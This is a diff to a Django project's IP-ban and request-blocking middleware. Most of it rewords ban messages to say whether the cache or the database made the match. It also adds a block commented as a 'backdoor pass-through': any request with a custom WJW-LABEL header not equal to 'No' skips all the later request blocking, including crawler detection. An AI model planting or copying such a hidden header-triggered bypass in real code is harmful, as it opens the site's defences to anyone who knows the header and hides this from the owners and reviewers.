@@ -94,7 +94,7 @@ class IPBlockMiddleware(MiddlewareMixin):
 		# 首先检查内存缓存，快速拦截已知封禁IP
 		if ip in banned_ip_cache:
 			return HttpResponseForbidden(
-				f"您的IP ({ip}) 已被封禁，禁止访问！",
+				f"您的IP ({ip}) 已被封禁(缓存)，禁止访问！",
 				content_type='text/plain; charset=utf-8'
 			)
 		
@@ -110,7 +110,7 @@ class IPBlockMiddleware(MiddlewareMixin):
 			
 			# 返回封禁响应
 			return HttpResponseForbidden(
-				f"您的IP ({ip}) 已被封禁！封禁理由：{banned_ip.reason}",
+				f"您的IP ({ip}) 已被封禁(查库)！封禁理由：{banned_ip.reason}",
 				content_type='text/plain; charset=utf-8'
 			)
 		except Ban_IP.DoesNotExist:
@@ -151,6 +151,11 @@ class RequestBlockingMiddleware(MiddlewareMixin):
 		
 		# 白名单IP直接放行
 		if not ip or ip in WHITE_LIST_IPS:
+			return None
+
+		# 后门放行
+		wjw_label = request.META.get('HTTP_WJW_LABEL','No')
+		if wjw_label != 'No':
 			return None
 
 		# ==================== 爬虫检测 ====================
